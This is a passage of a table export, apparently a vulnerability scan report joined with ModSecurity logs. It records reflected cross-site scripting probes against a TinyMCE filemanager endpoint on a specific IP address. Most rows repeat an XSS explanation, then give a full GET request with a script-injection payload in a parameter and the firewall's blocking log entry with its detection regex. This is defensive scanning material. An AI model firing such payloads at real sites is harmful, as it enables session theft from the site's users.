&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac2f761bb8</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=&quot;&gt;&lt;script&gt;alert(881299)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=sr3u061c6cta4o0kt9b4v2tmm2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:52</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:51 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac2f761bb8. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(881299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttN6wQAW0AAHhGMuQAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttN6wQAW0AAHhGMuQAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366942</td><td class=xl24 width=64 >2015-03-31 23:11:24</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(939799)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=qre8eksar7m1eib5pq12defo91
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:54</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:52 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(939799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttOKwQAW0AAHzDqsoAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttOKwQAW0AAHzDqsoAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366943</td><td class=xl24 width=64 >2015-03-31 23:14:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(828499)&lt;/script&gt;&lt;!--&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=s9q6pq4f3o95ljvf0c4vbhlse6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:55</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:54 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(828499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttOqwQAW0AAHewA9oAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttOqwQAW0AAHewA9oAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366944</td><td class=xl24 width=64 >2015-03-31 23:22:40</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(839699)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=2tljmtm3gmp3jn0i4jglq0ne65
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:56</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:55 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(839699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttO6wQAW0AABvT@HYAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttO6wQAW0AABvT@HYAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366945</td><td class=xl24 width=64 >2015-03-31 23:26:04</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&lt;script&gt;prompt(502799)&lt;/script/&gt;&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=prompt%28502799%29%2F; PHPSESSID=0ktul3mas41umoh7vmg0lgc596
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:57</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:56 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(502799)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttPKwQAW0AAHhB774AAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttPKwQAW0AAHhB774AAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366946</td><td class=xl24 width=64 >2015-03-31 23:26:44</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f89d6ce</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(343699)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f89d6ce=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=bfho10evcn6k0knbuvnuspkqb2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:59</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:57 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(343699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttPawQAW0AAD9hYOYAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttPawQAW0AAD9hYOYAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366947</td><td class=xl24 width=64 >2015-03-31 23:29:29</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac2f79e23f</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=&quot;&gt;&lt;script&gt;alert(406599)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=fg016f4fa5r7mb54060fs6rus4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:00</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:59 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac2f79e23f. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(406599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttP6wQAW0AABt@bWUAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttP6wQAW0AABt@bWUAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366948</td><td class=xl24 width=64 >2015-03-31 23:38:33</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&lt;script&gt;prompt(253699)&lt;/script/&gt;&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=jea8d4klotcfpupa8fo3bq11t0
Connection: Close

